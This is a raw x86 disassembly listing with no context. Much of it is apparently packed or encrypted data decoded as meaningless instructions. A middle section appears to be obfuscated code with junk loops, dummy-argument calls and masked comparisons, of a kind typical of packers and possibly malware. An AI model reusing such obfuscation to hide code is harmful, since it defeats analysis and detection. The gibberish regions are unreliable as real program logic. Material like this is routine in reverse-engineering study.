  40efe0:	push   ebx
  40efe1:	mov    eax,DWORD PTR [esi+0x55a16e8b]
  40efe7:	sbb    al,0x10
  40efe9:	aaa    
  40efea:	aad    0x45
  40efec:	ret    
  40efed:	cwde   
  40efee:	loope  0x40efa0
  40eff0:	test   eax,0x6e5b0994
  40eff5:	lahf   
  40eff6:	or     DWORD PTR [edx-0x2e],ecx
  40eff9:	jg     0x40efc9
  40effb:	and    dl,BYTE PTR [ebx]
  40effd:	pop    ebp
  40effe:	xor    dh,bh
  40f000:	stos   DWORD PTR es:[edi],eax
  40f001:	fimul  DWORD PTR [esi]
  40f003:	ret    0x314f
  40f006:	mov    edi,0xe2c4c7c8
  40f00b:	or     al,0x11
  40f00d:	mov    ebx,0x606f5eae
  40f012:	fcomp  QWORD PTR [eax]
  40f014:	mov    esp,0x2bfefa97
  40f019:	inc    ebx
  40f01a:	arpl   WORD PTR [edi],bx
  40f01c:	in     eax,0xa6
  40f01e:	fimul  DWORD PTR [edi-0x19]
  40f021:	sbb    BYTE PTR [edx],0xde
  40f024:	mov    ebp,0x97f444af
  40f029:	jno    0x40f043
  40f02b:	clc    
  40f02c:	add    ch,bh
  40f02e:	dec    ebx
  40f02f:	std    
  40f030:	shr    BYTE PTR [edi-0xd3635bf],0x51
  40f037:	sbb    DWORD PTR [ebp-0xf2ed434],ebx
  40f03d:	add    ebp,esi
  40f03f:	fwait
  40f040:	idiv   BYTE PTR [ebp+0x32ee5aab]
  40f046:	mov    cl,0xf2
  40f048:	aas    
  40f049:	clc    
  40f04a:	pusha  
  40f04b:	call   FWORD PTR [ebp+esi*1-0x7a]
  40f04f:	in     al,0x5d
  40f051:	or     eax,0x33c37777
  40f056:	sbb    DWORD PTR [edi],edi
  40f058:	test   eax,0x20085fd9
  40f05d:	mov    cl,0xf3
  40f05f:	lahf   
  40f060:	cs inc eax
  40f062:	inc    ebp
  40f063:	je     0x40efee
  40f065:	and    ecx,DWORD PTR [ebx]
  40f067:	xchg   edi,eax
  40f068:	fcmovb st,st(0)
  40f06a:	(bad)  [edx]
  40f06c:	adc    ah,bl
  40f06e:	mov    DWORD PTR [eax],eax
  40f070:	add    al,0xf2
  40f072:	and    DWORD PTR [ecx],eax
  40f074:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40f076:	push   edi
  40f077:	jbe    0x40f037
  40f079:	test   eax,0x3f237e42
  40f07e:	lock out dx,eax
  40f080:	pop    edx
  40f081:	and    al,0x86
  40f083:	pushf  
  40f084:	xor    ebx,esi
  40f086:	pop    ebp
  40f087:	jecxz  0x40f06f
  40f089:	mov    cl,BYTE PTR [ebp+0x3e]
  40f08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f08d:	push   ebx
  40f08e:	adc    DWORD PTR ds:0xcd7001e9,ebp
  40f094:	(bad)  
  40f095:	in     al,0x16
  40f097:	outs   dx,BYTE PTR ds:[esi]
  40f098:	adc    esp,eax
  40f09a:	inc    DWORD PTR [ebp+0x16]
  40f09d:	jbe    0x40f02b
  40f09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a0:	daa    
  40f0a1:	daa    
  40f0a2:	and    al,0x1a
  40f0a4:	mov    edi,0xa4e944ae
  40f0a9:	xchg   edi,eax
  40f0aa:	(bad)  
  40f0ab:	cli    
  40f0ac:	out    dx,eax
  40f0ad:	out    0x6d,al
  40f0af:	sbb    esp,edx
  40f0b1:	adc    BYTE PTR [ecx+eiz*2+0x6a79937f],0x4e
  40f0b9:	sti    
  40f0ba:	and    ch,0x9a
  40f0bd:	imul   ebx,DWORD PTR [edi],0xffffffa8
  40f0c0:	dec    esp
  40f0c1:	dec    ecx
  40f0c2:	jp     0x40f0f7
  40f0c4:	fild   QWORD PTR [edx-0xa]
  40f0c7:	shr    BYTE PTR [ebp+0x7d],1
  40f0ca:	test   BYTE PTR [edx+0x8d9e93e],ch
  40f0d0:	mov    esp,0xf12ead7e
  40f0d5:	xchg   ecx,eax
  40f0d6:	pop    esp
  40f0d7:	mov    al,cl
  40f0d9:	aam    0xce
  40f0db:	add    esp,DWORD PTR [esi]
  40f0dd:	out    0x5c,al
  40f0df:	nop
  40f0e0:	pop    ds
  40f0e1:	ficomp DWORD PTR [edx-0xa]
  40f0e4:	cld    
  40f0e5:	js     0x40f0fc
  40f0e7:	pop    ebp
  40f0e8:	pushf  
  40f0e9:	lea    edi,[eax+esi*4+0x4c77df1e]
  40f0f0:	mov    ah,0x5
  40f0f2:	pop    ebx
  40f0f3:	or     DWORD PTR [eax],ebx
  40f0f5:	test   al,0xb6
  40f0f7:	sub    eax,0xf39a747c
  40f0fc:	enter  0x3383,0x74
  40f100:	mov    BYTE PTR [esi+0x14],bh
  40f103:	jnp    0x40f123
  40f105:	xor    BYTE PTR ds:0xf282f521,0xec
  40f10c:	mov    esi,0xe34b5308
  40f111:	popa   
  40f112:	jno    0x40f173
  40f114:	pop    bp
  40f116:	jmp    0x40f0b7
  40f118:	mov    ah,0xb9
  40f11a:	mov    bl,0xdc
  40f11c:	xor    bl,bl
  40f11e:	cmc    
  40f11f:	out    0x6c,eax
  40f121:	bswap  esp
  40f123:	lea    esp,[eax-0x1a]
  40f126:	pop    ebx
  40f127:	jmp    0x40f12e
  40f129:	mov    bh,0x21
  40f12b:	cld    
  40f12c:	mov    al,ds:0xe1daad5c
  40f131:	or     DWORD PTR [ebx+ecx*4],esi
  40f134:	nop
  40f135:	pushf  
  40f136:	push   0xa2cde3ab
  40f13b:	and    DWORD PTR [edi-0x4f530f8b],ebp
  40f141:	(bad)  
  40f143:	das    
  40f144:	cdq    
  40f145:	out    0xb9,eax
  40f147:	in     al,0x5a
  40f149:	lods   eax,DWORD PTR ds:[esi]
  40f14a:	xor    ah,BYTE PTR [ecx]
  40f14c:	out    dx,al
  40f14d:	mov    esi,0x514182e1
  40f152:	sub    eax,eax
  40f154:	sub    dh,dl
  40f156:	call   0x3a92:0x27743a2a
  40f15d:	mov    edx,0xfe405904
  40f162:	(bad)  
  40f163:	test   DWORD PTR [edx],0xca9e59e5
  40f169:	jmp    0x780b:0x893fb0c9
  40f170:	add    al,0x8b
  40f172:	(bad)  
  40f173:	cmp    al,0xa3
  40f175:	jnp    0x40f118
  40f177:	aas    
  40f178:	sar    dl,1
  40f17a:	js     0x40f1a0
  40f17c:	dec    edi
  40f17d:	iret   
  40f17e:	sbb    dl,ah
  40f180:	pop    esi
  40f181:	xchg   edi,eax
  40f182:	or     al,0x9e
  40f184:	cmp    al,0xa7
  40f186:	out    0x55,al
  40f188:	lock fwait
  40f18a:	mov    edi,0x186fa232
  40f18f:	adc    esi,DWORD PTR [esi-0x2cb29388]
  40f195:	xchg   ebp,eax
  40f196:	idiv   bl
  40f198:	sti    
  40f199:	jmp    0xeececa05
  40f19e:	mov    al,0xe1
  40f1a0:	push   edx
  40f1a1:	and    DWORD PTR [ebx+0x5c4b6b7b],ebp
  40f1a7:	mov    cl,BYTE PTR [ebx+0x7edfe780]
  40f1ad:	sar    ch,0xf5
  40f1b0:	jb     0x40f13c
  40f1b2:	adc    dl,dl
  40f1b4:	push   cs
  40f1b5:	pmulhuw mm3,QWORD PTR [edx+ebp*4-0x55023cda]
  40f1bd:	mov    al,ds:0x3a3dd7df
  40f1c2:	mov    dh,0x13
  40f1c4:	test   eax,0xcf416175
  40f1c9:	sbb    edi,DWORD PTR [eax+0x55]
  40f1cc:	cmp    eax,esp
  40f1ce:	loop   0x40f1f3
  40f1d0:	xchg   ecx,eax
  40f1d1:	mov    ebx,0xa715b0fb
  40f1d6:	xor    esi,edx
  40f1d8:	mov    bl,0x3a
  40f1da:	or     DWORD PTR [edi+0x4f],eax
  40f1dd:	jecxz  0x40f240
  40f1df:	dec    edx
  40f1e0:	and    al,0x7c
  40f1e2:	cmc    
  40f1e3:	cmp    BYTE PTR [ebx+0x2],bh
  40f1e6:	out    dx,eax
  40f1e7:	outs   dx,DWORD PTR ds:[esi]
  40f1e8:	fisttp DWORD PTR [ebx-0x42e8d45b]
  40f1ee:	ror    BYTE PTR [edi+0x1],cl
  40f1f1:	mov    ch,0x50
  40f1f3:	jbe    0x40f26b
  40f1f5:	add    bl,dl
  40f1f7:	mul    esi
  40f1f9:	leave  
  40f1fa:	fdiv   DWORD PTR [esi]
  40f1fc:	std    
  40f1fd:	jbe    0x40f24e
  40f1ff:	in     al,dx
  40f200:	lock inc edx
  40f202:	cmp    esi,0x1cacb6ab
  40f208:	add    al,0xe6
  40f20a:	add    bl,ch
  40f20c:	daa    
  40f20d:	mov    al,ds:0xcb824098
  40f212:	lds    eax,FWORD PTR cs:[eax]
  40f215:	(bad)  
  40f216:	loope  0x40f231
  40f218:	inc    ecx
  40f219:	(bad)  
  40f21a:	std    
  40f21b:	push   ebp
  40f21c:	mov    WORD PTR [ebx],cs
  40f21e:	pusha  
  40f21f:	mov    eax,0x30c40c39
  40f224:	adc    ecx,DWORD PTR [eax+0x762a8039]
  40f22a:	fldz   
  40f22c:	jae    0x40f231
  40f22e:	(bad)  
  40f22f:	or     al,0x12
  40f231:	fcmovne st,st(3)
  40f233:	popf   
  40f234:	mov    edi,0x1c6b760e
  40f239:	xor    ah,BYTE PTR [ebx-0x6f91a56f]
  40f23f:	in     eax,dx
  40f240:	lods   eax,DWORD PTR ds:[esi]
  40f241:	or     ebx,0x27
  40f244:	lods   eax,DWORD PTR ds:[esi]
  40f245:	hlt    
  40f246:	or     dl,bh
  40f248:	daa    
  40f249:	mov    ebp,0x3eee4804
  40f24e:	jno    0x40f24e
  40f250:	mov    al,ds:0x48b9c402
  40f255:	enter  0x5fea,0xf3
  40f259:	push   0x49
  40f25b:	sbb    eax,0x2b4c4893
  40f260:	pop    ecx
  40f261:	push   eax
  40f262:	cli    
  40f263:	mov    al,ds:0x7fdb52ec
  40f268:	fstp   TBYTE PTR [edi+0x9]
  40f26b:	out    dx,eax
  40f26c:	xlat   BYTE PTR ds:[ebx]
  40f26d:	cmp    al,0x13
  40f26f:	xchg   ebp,eax
  40f270:	shr    DWORD PTR [esi],0xd3
  40f273:	pop    esp
  40f274:	pop    edx
  40f275:	repz xchg ebp,eax
  40f277:	pop    es
  40f278:	mov    dh,0x43
  40f27a:	test   eax,0x976aa849
  40f27f:	data16 add ax,WORD PTR [edi-0x79df4a6f]
  40f287:	lods   eax,DWORD PTR ds:[esi]
  40f288:	mov    edi,0xf8ec203f
  40f28d:	mov    ds:0x4d898e00,al
  40f292:	pop    es
  40f293:	loopne 0x40f26c
  40f295:	push   eax
  40f296:	fldenv [ebx-0x15cfd5cc]
  40f29c:	leave  
  40f29d:	(bad)  
  40f29e:	inc    eax
  40f29f:	sti    
  40f2a0:	xchg   esi,eax
  40f2a1:	add    ebp,DWORD PTR [ebx+0x28]
  40f2a4:	inc    esp
  40f2a5:	daa    
  40f2a6:	xchg   BYTE PTR ds:0xa3c6cfe2,ah
  40f2ac:	pop    es
  40f2ad:	mov    dl,0xb8
  40f2af:	jo     0x40f273
  40f2b1:	loop   0x40f240
  40f2b3:	jb     0x40f292
  40f2b5:	jne    0x40f2f2
  40f2b7:	loopne 0x40f2a2
  40f2b9:	xor    al,0x37
  40f2bb:	and    al,0xad
  40f2bd:	xor    dl,dl
  40f2bf:	rcl    DWORD PTR [edx+edi*1],0xbe
  40f2c3:	(bad)  
  40f2c4:	(bad)  
  40f2c5:	lods   eax,DWORD PTR ds:[esi]
  40f2c6:	mov    al,ds:0x31077d6d
  40f2cb:	fmul   DWORD PTR [ebp+0x302f1b0a]
  40f2d1:	mov    al,ds:0x440d9431
  40f2d6:	pushf  
  40f2d7:	xor    eax,esi
  40f2d9:	pop    ecx
  40f2da:	sahf   
  40f2db:	xchg   esi,eax
  40f2dc:	jmp    0x40f311
  40f2de:	in     al,0x5a
  40f2e0:	outs   dx,DWORD PTR ds:[esi]
  40f2e1:	(bad)  
  40f2e2:	mov    edi,0x56dc009b
  40f2e7:	ret    
  40f2e8:	ss jae 0x40f2e5
  40f2eb:	mov    WORD PTR [esi+0x45],es
  40f2ee:	ins    BYTE PTR es:[edi],dx
  40f2ef:	jp     0x40f309
  40f2f1:	aas    
  40f2f2:	pop    ebp
  40f2f3:	outs   dx,DWORD PTR ds:[esi]
  40f2f4:	cli    
  40f2f5:	add    DWORD PTR [eax],edx
  40f2f7:	(bad)  
  40f2f8:	xor    cl,BYTE PTR [ebx]
  40f2fa:	dec    eax
  40f2fb:	dec    edi
  40f2fc:	sub    DWORD PTR [esi-0x4272b1fa],0xffffffb9
  40f303:	(bad)
  40f307:	add    eax,0xb751d5c2
  40f30c:	jl     0x40f2d6
  40f30e:	mov    dh,0xd2
  40f310:	repnz adc BYTE PTR [esi+0x9],dl
  40f314:	lods   eax,DWORD PTR ds:[esi]
  40f315:	fwait
  40f316:	mov    ah,0xda
  40f318:	retf   0xde06
  40f31b:	nop
  40f31c:	call   0xa2b3817a
  40f321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f322:	jecxz  0x40f327
  40f324:	dec    edx
  40f325:	jle    0x40f2bd
  40f327:	sub    edi,DWORD PTR [edx+0x5824bcdd]
  40f32d:	aas    
  40f32e:	xchg   dl,dl
  40f330:	pop    eax
  40f331:	ds mov esp,0x3bcd329c
  40f337:	ins    BYTE PTR es:[edi],dx
  40f338:	add    BYTE PTR [edx+0x49d27568],ah
  40f33e:	sahf   
  40f33f:	popa   
  40f340:	inc    edi
  40f341:	scas   eax,DWORD PTR es:[edi]
  40f342:	shr    esp,cl
  40f344:	test   al,0xb8
  40f346:	call   0xd5401069
  40f34b:	nop
  40f34c:	iret   
  40f34d:	in     eax,dx
  40f34e:	xchg   edi,eax
  40f34f:	pop    ebp
  40f350:	ja     0x40f37a
  40f352:	ja     0x40f357
  40f354:	xlat   BYTE PTR ds:[ebx]
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	mov    eax,ds:0xdc52a224
  40f70c:	int    0x7c
  40f70e:	jl     0x40f6fb
  40f710:	pop    edi
  40f711:	jl     0x40f78f
  40f713:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40f715:	in     eax,dx
  40f716:	loope  0x40f707
  40f718:	ficom  DWORD PTR [ebx+0x43dcd230]
  40f71e:	or     eax,0x9c77623f
  40f723:	or     DWORD PTR [esp+edi*2],esp
  40f726:	pop    ebx
  40f727:	add    ecx,DWORD PTR [ebx+0x12]
  40f72a:	test   al,0x5e
  40f72c:	push   ecx
  40f72d:	xor    eax,0xb712a6d5
  40f732:	out    dx,eax
  40f733:	out    dx,al
  40f734:	cmp    BYTE PTR ds:0xcfd7141,bh
  40f73a:	lods   eax,DWORD PTR ds:[esi]
  40f73b:	jge    0x40f78a
  40f73d:	in     eax,dx
  40f73e:	pusha  
  40f73f:	inc    DWORD PTR [ecx]
  40f741:	dec    ebp
  40f742:	int3   
  40f743:	pop    eax
  40f744:	ror    DWORD PTR [ecx],1
  40f746:	add    esi,DWORD PTR [eax-0x35]
  40f749:	pop    es
  40f74a:	sbb    eax,0xf94a49ab
  40f74f:	sbb    DWORD PTR [ecx-0x1fbc524f],eax
  40f755:	add    ebx,DWORD PTR [ecx-0x4720aafa]
  40f75b:	and    dl,BYTE PTR [esi]
  40f75d:	sbb    eax,0xa83ece42
  40f762:	dec    BYTE PTR [edx]
  40f764:	jl     0x40f740
  40f766:	int3   
  40f767:	aam    0xf0
  40f769:	mov    bl,BYTE PTR [ebx]
  40f76b:	or     eax,0x60864952
  40f770:	xchg   esp,eax
  40f771:	int    0x76
  40f773:	test   eax,0xf92fc324
  40f778:	ins    BYTE PTR es:[edi],dx
  40f779:	retf   
  40f77a:	add    al,0xe2
  40f77c:	mov    al,ds:0x317ecf86
  40f781:	inc    esp
  40f782:	mov    al,ds:0xa5167181
  40f787:	imul   ecx,DWORD PTR [edx],0x546172e3
  40f78d:	add    DWORD PTR [ecx+0x731c420a],0x4e
  40f794:	popf   
  40f795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f796:	pop    edx
  40f797:	push   ebp
  40f798:	into   
  40f799:	and    eax,esi
  40f79b:	or     BYTE PTR [ebp-0x2],ah
  40f79e:	mov    cl,0xc1
  40f7a0:	cs std 
  40f7a2:	pop    esp
  40f7a3:	inc    ebx
  40f7a4:	ins    BYTE PTR es:[edi],dx
  40f7a5:	adc    eax,0x6610fc0e
  40f7aa:	fwait
  40f7ab:	mov    al,ds:0x173baa25
  40f7b0:	stc    
  40f7b1:	(bad)  
  40f7b2:	gs push cs
  40f7b4:	cmc    
  40f7b5:	loopne 0x40f7bf
  40f7b7:	out    0xc1,al
  40f7b9:	shr    ah,cl
  40f7bb:	jmp    0x35efbfac
  40f7c0:	out    0x56,eax
  40f7c2:	pop    eax
  40f7c3:	mov    edi,0x6905bc1c
  40f7c8:	sbb    esp,DWORD PTR [ebx-0x77531868]
  40f7ce:	mov    eax,0xb7aae620
  40f7d3:	inc    edi
  40f7d4:	xor    ch,BYTE PTR [eax+ebx*1-0x4]
  40f7d8:	pushf  
  40f7d9:	fstp   QWORD PTR cs:[ebx-0x3744fbdc]
  40f7e0:	mov    dh,0x27
  40f7e2:	aam    0x44
  40f7e4:	test   BYTE PTR [eax],0xfa
  40f7e7:	xchg   edi,eax
  40f7e8:	mov    edi,0x71f42d5d
  40f7ed:	push   ebp
  40f7ee:	enter  0x391,0xd8
  40f7f2:	enter  0xe492,0x37
  40f7f6:	sbb    ebp,DWORD PTR [edx+edx*8-0x19]
  40f7fa:	pop    ecx
  40f7fb:	test   al,0xa5
  40f7fd:	sub    esi,DWORD PTR [ecx]
  40f7ff:	aaa    
  40f800:	cmp    BYTE PTR [eax-0x56],ah
  40f803:	pop    esp
  40f804:	mov    fs,WORD PTR [ecx]
  40f806:	adc    dl,BYTE PTR [ebx-0x1051b245]
  40f80c:	ficom  WORD PTR [eax-0x5d18b5e7]
  40f812:	loope  0x40f7d0
  40f814:	cmp    bl,bh
  40f816:	sub    eax,0x74a9fa1
  40f81b:	fnsave [edi-0x295a85bc]
  40f821:	stos   BYTE PTR es:[edi],al
  40f822:	sub    al,0x20
  40f824:	in     al,dx
  40f825:	test   DWORD PTR [eax-0x617c341f],ebx
  40f82b:	pop    esi
  40f82c:	xor    eax,0x502cd9b5
  40f831:	mov    bh,0xab
  40f833:	fs inc edx
  40f835:	push   edi
  40f836:	addr16 out 0x92,al
  40f839:	js     0x40f809
  40f83b:	jmp    0x6fe90df6
  40f840:	xchg   esi,eax
  40f841:	mov    bl,0x0
  40f843:	or     BYTE PTR [edi-0x2d],dl
  40f846:	lock dec eax
  40f848:	xchg   BYTE PTR ds:[esp+edi*4],ah
  40f84c:	push   ebx
  40f84d:	in     al,0xee
  40f84f:	lods   al,BYTE PTR ds:[esi]
  40f850:	enter  0x9696,0x38
  40f854:	cwde   
  40f855:	push   ss
  40f856:	cmp    BYTE PTR [eax+0x76040d2b],ch
  40f85c:	ficomp DWORD PTR [ebx]
  40f85e:	mov    es,WORD PTR [esp]
  40f861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f862:	cdq    
  40f863:	xchg   esp,eax
  40f864:	cwde   
  40f865:	jnp    0x40f844
  40f867:	imul   esi,esp,0xa53525cb
  40f86d:	dec    esi
  40f86e:	scas   eax,DWORD PTR es:[edi]
  40f86f:	mov    ebx,DWORD PTR [edx]
  40f871:	lods   eax,DWORD PTR ds:[esi]
  40f872:	jnp    0x40f820
  40f874:	scas   al,BYTE PTR es:[edi]
  40f875:	nop
  40f876:	fdivr  st,st(0)
  40f878:	sahf   
  40f879:	xchg   edx,eax
  40f87a:	pop    es
  40f87b:	hlt    
  40f87c:	daa    
  40f87d:	push   0x6a399dbb
  40f882:	(bad)  
  40f883:	enter  0xe7ac,0x55
  40f887:	jmp    0x5f9:0x56759f30
  40f88e:	scas   eax,DWORD PTR es:[edi]
  40f88f:	jb     0x40f8e8
  40f891:	pop    esp
  40f892:	push   0xca77867
  40f897:	int    0xb
  40f899:	pushf  
  40f89a:	push   edx
  40f89b:	data16 out 0x6,al
  40f89e:	add    ebx,eax
  40f8a0:	popf   
  40f8a1:	and    BYTE PTR [edx],dh
  40f8a3:	jb     0x40f903
  40f8a5:	pop    ds
  40f8a6:	dec    ebx
  40f8a7:	rcl    BYTE PTR [ebx],1
  40f8a9:	enter  0x8ea5,0xed
  40f8ad:	push   ebp
  40f8ae:	sbb    al,0x15
  40f8b0:	retf   
